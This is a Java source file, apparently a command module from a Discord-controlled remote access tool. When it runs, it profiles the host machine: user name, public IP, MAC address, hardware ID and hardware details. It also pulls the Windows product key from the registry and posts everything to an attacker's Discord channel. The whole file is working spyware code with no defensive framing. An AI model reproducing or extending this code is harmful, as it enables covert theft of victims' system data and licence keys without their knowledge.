package me.vasler.command.impl;

import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.WinReg;
import com.sun.management.OperatingSystemMXBean;
import me.vasler.command.Command;
import me.vasler.utils.os.MacUtil;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.MessageEmbed;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;

import java.awt.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.management.ManagementFactory;
import java.net.URL;
import java.security.MessageDigest;

public class InfoCommand extends Command {

    public InfoCommand() {
        super(new String[]{"info", "pcinfo"});
    }

    @Override
    public void run(String[] args, TextChannel channel) {
        try {
            OperatingSystemMXBean bean = (OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean();
            long amount = (bean.getTotalPhysicalMemorySize() / 1000000000);
            int processors = bean.getAvailableProcessors();
            EmbedBuilder eb = new EmbedBuilder();
            eb.setTitle("PC Info", null);
            eb.setColor(Color.BLUE);
            String Omg = Advapi32Util.registryGetStringValue(WinReg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform", "BackupProductKeyDefault");
            String string = "";
            string += "Computer Name: " + System.getProperty("user.name") + "\n";
            string += "IP Address: " + getIP() + "\n";
            string += "RAM Amount: " + (amount) + " GB" + "\n";
            string += "MAC Address: " + MacUtil.getAddress() + "\n";
            string += "Available CPU Cores: " + processors + "\n";
            string += "Arch: " + bean.getArch() + "\n";
            string += "HWID: " + getID() + "\n";
            string += "OS: " + System.getProperty("os.name") + "\n";
            string += "window key: " + Omg + "\n";
            eb.setDescription(string);
            eb.setFooter("ieatworms - Created by Valser and RailHack", "https://media.discordapp.net/attachments/1176729350398287912/1179982540384260167/OIP_1.png?ex=657bc360&is=65694e60&hm=7cc00a922bca808938bbb25e19e807621545bb2468823bb699ba2b78816ec385&=&format=webp&quality=lossless");
            channel.sendMessageEmbeds(eb.build(), new MessageEmbed[0]).queue();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String getID()
    {
        try
        {
            MessageDigest hash = MessageDigest.getInstance( "MD5" );
            String s = System.getProperty( "os.name" ) + System.getProperty( "os.arch" ) + System.getProperty( "os.version" ) + Runtime.getRuntime().availableProcessors() + System.getenv( "PROCESSOR_IDENTIFIER" ) + System.getenv( "PROCESSOR_ARCHITECTURE" ) + System.getenv( "PROCESSOR_ARCHITEW6432" ) + System.getenv( "NUMBER_OF_PROCESSORS" );
            return bytesToHex( hash.digest( s.getBytes() ) );
        } catch ( Exception e )
        {
            return "######################";
        }
    }

    private static String bytesToHex( byte[] bytes )
    {
        char[] hexChars = new char[ bytes.length * 2 ];
        for ( int j = 0; j < bytes.length; j++ )
        {
            int v = bytes[ j ] & 0xFF;
            hexChars[ j * 2 ] = "0123456789ABCDEF".toCharArray()[ v >>> 4 ];
            hexChars[ j * 2 + 1 ] = "0123456789ABCDEF".toCharArray()[ v & 0x0F ];
        }
        return new String( hexChars );
    }

    private String getIP() throws Exception {
        StringBuilder builder = new StringBuilder();
        BufferedReader reader = new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com").openStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            builder.append(line);
        }
        return builder.toString();
    }

}
